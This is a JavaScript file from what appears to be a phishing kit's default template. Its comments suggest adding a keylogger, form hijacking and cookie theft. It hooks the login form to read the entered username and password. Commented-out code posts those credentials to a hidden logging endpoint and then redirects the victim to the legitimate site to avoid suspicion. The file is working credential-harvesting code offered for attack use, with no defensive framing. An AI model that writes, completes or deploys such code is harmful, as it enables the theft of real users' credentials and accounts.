// sovietcy/templates/default_phish_template/script.js
console.log("Phishing site loaded. Ready to capture.");

// You would add malicious JavaScript here, for example:
// - A keylogger that sends keystrokes to your server
// - Code to hijack form submissions before they reach the server (though Flask handles POST here)
// - Code to try and steal cookies or local storage data

// Example (very basic) of intercepting form submission with JavaScript
document.addEventListener('DOMContentLoaded', () => {
    const form = document.querySelector('form');
    if (form) {
        form.addEventListener('submit', (event) => {
            // event.preventDefault(); // Uncommenting this would prevent default submission

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            console.log('Intercepted! Username:', username, 'Password:', password);

            // In a real attack, you would send this data to a hidden endpoint on your server
            // For example, using fetch API:
            /*
            fetch('/log_data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password }),
            })
            .then(response => response.text())
            .then(data => console.log('Data sent to server:', data))
            .catch((error) => console.error('Error sending data:', error));
            */

            // After logging/sending data, you'd typically allow the form to submit
            // or redirect the user to the legitimate site to avoid suspicion.
            // If event.preventDefault() is used, you'd manually redirect:
            // window.location.href = "https://legitimate-site.com/login";
        });
    }
});
